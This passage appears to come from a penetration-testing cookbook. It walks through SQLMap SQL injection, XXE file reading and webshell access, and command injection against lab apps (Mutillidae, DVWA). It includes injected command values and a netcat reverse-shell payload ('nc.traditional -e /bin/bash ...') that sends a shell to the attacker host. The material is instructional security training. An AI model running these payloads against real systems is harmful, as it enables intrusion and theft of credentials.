- en: '[https://www.sans.org/reading-room/whitepapers/securecode/sql-injection-modes-attack-defence-matters-23](https://www.sans.org/reading-room/whitepapers/securecode/sql-injection-modes-attack-defence-matters-23)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Finding and exploiting SQL injections with SQLMap
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: As seen in the previous recipe, exploiting SQLi can be an industrious process.
    SQLMap is a command-line tool included in Kali Linux that can help us with the
    automation of detecting and exploiting SQL injections with multiple techniques
    and in a wide variety of databases.
  prefs: []
  type: TYPE_NORMAL
- en: In this recipe, we will use SQLMap to detect and exploit an SQLi vulnerability
    and to obtain usernames and passwords of an application.
  prefs: []
  type: TYPE_NORMAL
- en: How to do it...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'Browse to `http://192.168.56.11/mutillidae` and go to OWASP Top 10 | A1 – SQL
    Injection | SQLi Extract Data | User Info:'
  prefs: []
  type: TYPE_NORMAL
- en: Try any username and password, for example, `user` and `password`, and click
    View Account Details.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: The login will fail, but we are interested in the URL. Go to the address bar
    and copy the full URL to the clipboard. It should be something like `http://192.168.56.11/mutillidae/index.php?page=user-info.php&username=user&password=password&user-info-php-submit-button=View+Account+Details`.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Now, in a Terminal window, type the following command:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '[PRE9]'
  prefs: []
  type: TYPE_PRE
- en: 'You can see that the `-u` parameter has the copied URL as its value. With `-p`,
    we are telling SQLMap that we want to look for SQLi in the username parameter
    and, once the vulnerability is exploited, that we want it to retrieve the current
    database username and the database''s name, and know whether that user has administrative
    permissions within the database. The retrieval of this information is because
    we only want to be able to tell whether there is an SQLi in that URL in the `username`
    parameter. The following screenshot shows the command and how SQLMap indicates
    execution:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/c5c23c54-10d7-40fb-ac2c-6bfa0899d3c0.png)'
  prefs: []
  type: TYPE_IMG
- en: Once SQLMap detects the DBMS used by the application, it will also ask whether
    we want to skip the test for other DBMS and whether we want to include all tests
    for the specific system detected, even if they are beyond the scope of the current
    level and risk configured. In this case, we answer `Yes` to skip other systems
    and `No` to include all tests.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Once the parameter we specified is found to be vulnerable, SQLMap will ask
    us whether we want to test other parameters. We answer `No` to this question,
    and then we will see the result:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/45b3cdef-1210-4066-bd50-19218672da61.png)'
  prefs: []
  type: TYPE_IMG
- en: 'If we want to obtain the usernames and passwords, like we did in the previous
    recipe, we need to know the name of the table that has such information. Execute
    the following command in the Terminal:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '[PRE10]'
  prefs: []
  type: TYPE_PRE
- en: 'SQLMap saves a log of the injections it performs, so this second attack will
    take less time than the first one. As you can see, the attack returns the list
    of tables in the database we specified:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/6fee352d-7231-4dab-84e2-5100c35c8c14.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Table accounts is the one that looks like having the information we want. Let''s
    dump its content:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '[PRE11]'
  prefs: []
  type: TYPE_PRE
- en: 'We now have the full users'' table, and we can see in this case that passwords
    aren''t encrypted, so we can use them as we see them:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/4d94d71a-f2b3-4807-8628-2142eef2f984.png)'
  prefs: []
  type: TYPE_IMG
- en: 'SQLMap can also be used to escalate privileges in the database and the operating
    system. For example, if the database user is administrator, as is the case here,
    we can use the `--users` and `--passwords` options to extract names and password
    hashes of all database users, as shown in the following screenshot:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/1e669776-3799-40b2-8442-bb2176bba0af.png)'
  prefs: []
  type: TYPE_IMG
- en: Often, these are also operating system users and will allow us to escalate to
    the operating system or other network hosts.
  prefs: []
  type: TYPE_NORMAL
- en: 'We can also get a shell that will allow us to send SQL queries to the database
    directly, as shown here:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/7e15e477-a960-496f-a544-4a2a783942ca.png)'
  prefs: []
  type: TYPE_IMG
- en: How it works...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: SQLMap fuzzes all inputs in the given URL and data, or only the specified one
    in the `-p `option, with SQLi strings and interprets the response to discover
    whether or not there is a vulnerability. It's good practice not to fuzz all inputs;
    it's better to use SQLMap to exploit an injection that we already know exists
    and always try to narrow the search process providing all information available
    to us, such as vulnerable parameters, DBMS type, and others; looking for an injection
    with all the possibilities open could take a lot of time and generate very suspicious
    traffic in the network.
  prefs: []
  type: TYPE_NORMAL
- en: 'In this recipe, we already knew that the username parameter was vulnerable
    to SQLi (since we used the SQLi test page from `mutillidae`). In the first attack,
    we only wanted to be sure that there was an injection there and asked for some
    very basic information: user name (`--curent-user`), database name (`--current-db`),
    and whether the user is an administrator (`--is-dba`).'
  prefs: []
  type: TYPE_NORMAL
- en: In the second attack, we specified the database we wanted to query with the
    `-D` option and the name obtained from the previous attack, and asked for the
    list of tables it contains with `--tables`. Knowing what table we wanted to get
    (`-T accounts`), we told SQLMap to dump its content with `--dump`.
  prefs: []
  type: TYPE_NORMAL
- en: As the user querying the database from the application is DBA, it allows us
    to ask the database for other users' information, and SQLMap makes our lives much
    easier with the `--users` and `--passwords` options. These options ask for usernames
    and passwords, as all DBMSes store their users' passwords encrypted, and what
    we obtained were hashes, so we still have to use a password cracker to crack them.
    If you said `Yes` when SQLMap asked to perform a dictionary attack, you may now
    know the password of some users.
  prefs: []
  type: TYPE_NORMAL
- en: We also used the `--sql-shell` option to obtain a shell from which we could
    send SQL queries to the database. That was not a real shell, of course, just SQLMap
    sending the commands we wrote through SQLi and returning the results of those
    queries.
  prefs: []
  type: TYPE_NORMAL
- en: There's more...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: SQLMap can also inject input variables in `POST` requests. To do that, we only
    need to add the `--data` option, followed by the `POST` data inside quotes, for
    example: `--data “username=test&password=test”`.
  prefs: []
  type: TYPE_NORMAL
- en: Sometimes, we need to be authenticated in an application in order to have access
    to the vulnerable URL of an application. If this happens, we can pass a valid
    session's cookie to SQLMap using the `--cookie` option: `--cookie “PHPSESSID=ckleiuvrv60fs012hlj72eeh37”`. This
    is also useful for testing for injections in cookie values.
  prefs: []
  type: TYPE_NORMAL
- en: Another interesting feature of this tool is that, besides the fact that it can
    bring us an SQL shell where we can issue SQL queries, more interestingly, we could
    gain command execution in the database server using `--os-shell` (this is especially
    useful when injecting Microsoft SQL Server). To see all the options and features
    that SQLMap has, you can run `sqlmap --help`.
  prefs: []
  type: TYPE_NORMAL
- en: See also
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'Kali Linux includes other tools that are capable of detecting and exploiting
    SQLi vulnerabilities that may be useful to use instead of, or in conjunction with,
    SQLMap:'
  prefs: []
  type: TYPE_NORMAL
- en: '**sqlninja**: A very popular tool dedicated to MS SQL Server exploitation.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Bbqsql**: A blind SQLi framework written in Python.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**jsql**: A Java-based tool with a fully automated GUI; we just need to introduce
    the URL and click a button.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Metasploit**: This includes various SQLi modules for different DBMSes.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Exploiting an XML External Entity injection
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: XML is a format mainly used to describe the structure of documents or data;
    HTML, for example, is a use of XML.
  prefs: []
  type: TYPE_NORMAL
- en: XML entities are like data structures defined inside an XML structure, and some
    of them have the ability to read files from the system or even execute commands.
  prefs: []
  type: TYPE_NORMAL
- en: In this recipe, we will exploit an **XML External Entity** (**XEE**) injection
    vulnerability to read files from the server and remotely execute code in it.
  prefs: []
  type: TYPE_NORMAL
- en: Getting ready
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: We suggest that you read the *Abusing file inclusions and uploads* recipe before
    doing this.
  prefs: []
  type: TYPE_NORMAL
- en: How to do it...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'Refer to the following steps:'
  prefs: []
  type: TYPE_NORMAL
- en: Browse to `http://192.168.56.11/mutillidae/index.php?page=xml-validator.php`.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'It say it is an XML validator. Let''s try to submit the example test and see
    what happens. In the XML box, put `<somexml><message>Hello World</message></somexml>`
    and click Validate XML. It should only display the message `Hello World` in the
    parsed section:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/06c41430-2d9b-46e7-9f51-ee5d044c13cf.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Now, let''s see whether it processes entities correctly. Enter the following:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '[PRE12]'
  prefs: []
  type: TYPE_PRE
- en: 'Here, we only defined an entity and set the value `Mr Bob` to it. The parser
    interprets the entity and replaces the value when showing the result:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/8396a7da-bf92-4546-abc9-3baa2639bf22.png)'
  prefs: []
  type: TYPE_IMG
- en: 'That''s the use of an internal entity. Let''s try an external one:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '[PRE13]'
  prefs: []
  type: TYPE_PRE
- en: 'In the result, we can see that the injection returns the contents of a file:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/5d38613a-c227-4d9c-97ad-22412815484c.png)'
  prefs: []
  type: TYPE_IMG
- en: Using this technique, we can extract any file in the system that is readable
    to the user under which the web server runs.
  prefs: []
  type: TYPE_NORMAL
- en: 'We can also use XEE to load web pages. In *Abusing file inclusions*, we managed
    to upload a webshell to the server. Let''s try to reach it:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '[PRE14]'
  prefs: []
  type: TYPE_PRE
- en: 'This results in the page including and executing the server-side code and returning
    the command''s result:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/040cb0b8-9aab-4bc6-823d-0fd68c2e638f.png)'
  prefs: []
  type: TYPE_IMG
- en: How it works...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: XML gives the possibility of defining entities. An entity in XML is a name with
    a value associated with it. Every time an entity is used in the document, it will
    be replaced by its value when the XML file is processed. Using this and the different
    wrappers available (such as `file://` to load system files, or `http://` to load
    URLs), we can abuse implementations that don't have the proper security measures
    in terms of input validation and XML parser configuration, and extract sensitive
    data or even execute commands in the server.
  prefs: []
  type: TYPE_NORMAL
- en: In this recipe, we used the `file://` wrapper to make the parser load an arbitrary
    file from the server, and, after that, with the `http://` wrapper, we called a
    web page that happened to be a `webshell` in the same server and executed system
    commands with it.
  prefs: []
  type: TYPE_NORMAL
- en: There's more...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: There is also a **Denial of Service** (**DoS**) attack through this vulnerability
    called **billion laughs**. You can read more about it on wikipedia: [https://en.wikipedia.org/wiki/Billion_laughs](https://en.wikipedia.org/wiki/Billion_laughs).
  prefs: []
  type: TYPE_NORMAL
- en: There is a different wrapper (such as `file://` or `http://`) for XML entities
    supported by PHP, which, if enabled in the server, could allow command execution
    without the need to upload a file. It is expect `://`. You can find more information
    on this and other wrappers at [http://www.php.net/manual/en/wrappers.php](http://www.php.net/manual/en/wrappers.php).
  prefs: []
  type: TYPE_NORMAL
- en: See also
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'To see an impressive example of how XEE vulnerabilities were found in some
    of the most popular websites in the world, have a look at [http://www.ubercomp.com/posts/2014-01-16_facebook_remote_code_execution](http://www.ubercomp.com/posts/2014-01-16_facebook_remote_code_execution).
    Or, for a more recent example, check out this exploitation of Oracle Peoplesoft:
    [https://www.ambionics.io/blog/oracle-peoplesoft-xxe-to-rce](https://www.ambionics.io/blog/oracle-peoplesoft-xxe-to-rce).'
  prefs: []
  type: TYPE_NORMAL
- en: Detecting and exploiting command injection vulnerabilities
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: We have seen before how PHP's `system()` can be used to execute operating system
    commands in the server; sometimes, developers use instructions such as that, or
    others with the same functionality, to perform certain tasks. Sometimes, they
    use unvalidated user input as parameters for the execution of commands.
  prefs: []
  type: TYPE_NORMAL
- en: In this recipe, we will exploit a command injection vulnerability and extract
    important information from the server.
  prefs: []
  type: TYPE_NORMAL
- en: How to do it...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'Log into DVWA and go to Command Execution:'
  prefs: []
  type: TYPE_NORMAL
- en: 'We will see a Ping for FREE form. Let''s try it! Ping to `192.168.56.10` (our
    Kali Linux machine''s IP):'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/ba776c6d-d9dd-4d98-8486-43165a1ec8c2.png)'
  prefs: []
  type: TYPE_IMG
- en: That output looks like it was taken directly from the ping command's output.
    This suggests that the server is using an operating system command to execute
    the ping, so it may be possible to inject operating system commands.
  prefs: []
  type: TYPE_NORMAL
- en: 'Let''s try to inject a very simple command. Submit the following code, `192.168.56.10;uname
    -a`:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/de4aa7a4-4c44-45e8-9382-a645469ba7f1.png)'
  prefs: []
  type: TYPE_IMG
- en: We can see the `uname` command's output just after ping's output. We have a
    command injection vulnerability here.
  prefs: []
  type: TYPE_NORMAL
- en: 'How about without the IP address: `;uname -a`. The result is shown in the following
    screenshot:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/544d8ffd-b9dc-4eb7-b22a-37ec3c699546.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Now, we are going to obtain a reverse shell on the server. First, we must be
    sure the server has everything we need. Submit `;ls /bin/nc*`. It should return
    a list of files with a full path:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/3f7e3524-5ef0-4164-a304-b7c640a480b7.png)'
  prefs: []
  type: TYPE_IMG
- en: So, we have more than one version of NetCat, which is the tool we are going
    to use to generate the connection. The OpenBSD version of NetCat does not support
    the execution of commands on connection, so we will use the traditional one.
  prefs: []
  type: TYPE_NORMAL
- en: 'The next step is to listen to a connection in our Kali machine; open a Terminal
    and run the following command:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '[PRE15]'
  prefs: []
  type: TYPE_PRE
- en: 'And, back in the browser, submit the following: `;nc.traditional -e /bin/bash
    192.168.56.10 1691 &`.'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'We will see how a connection is received in the listening Kali Terminal. There,
    we can execute commands on the server, as in the following example:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/1f02672a-70ee-46c3-a990-1db4e14bd906.png)'
  prefs: []
  type: TYPE_IMG
- en: Our Terminal will react to the connection. We now can issue non-interactive
    commands and check their output.
  prefs: []
  type: TYPE_NORMAL
- en: How it works...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'As in the case of SQLi and others, command injection vulnerabilities are due
    to a poor input validation mechanism and the use of user-provided data to form
    strings that will later be used as commands to the operating system. If we look
    at the source code of the page we just attacked (there is a button in the bottom
    right-hand corner on every DVWA''s page), it will look just like this:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE16]'
  prefs: []
  type: TYPE_PRE
- en: We can see it directly appends the user's input to the `ping` command. All we
    did was to add a semicolon, which the system's shell interpreted as a command
    separator, and next to it, the command we wanted to execute.
  prefs: []
  type: TYPE_NORMAL
- en: After having a successful command execution, the next step was to verify whether
    the server had NetCat, which is a tool that has the ability to establish network
    connections and, in some versions, to execute a command when a new connection
    is established. We saw that the server's system had two different versions of
    NetCat and executed the one we know supports the feature we require.
  prefs: []
  type: TYPE_NORMAL
- en: We then set our attacking system to listen for a connection on TCP port `1691`
    (it could have been any other available TCP port), and after that, we instructed
    the server to connect to our machine through that port and to execute `/bin/bash`
    (a system shell) when the connection establishes. Anything we send through that
    connection will be received as input by the shell in the server. The use of `&`
    at the end of the command is to execute it in the background and prevent the PHP
    script's executions from stopping because it's waiting for a response from the
    command.
  prefs: []
  type: TYPE_NORMAL
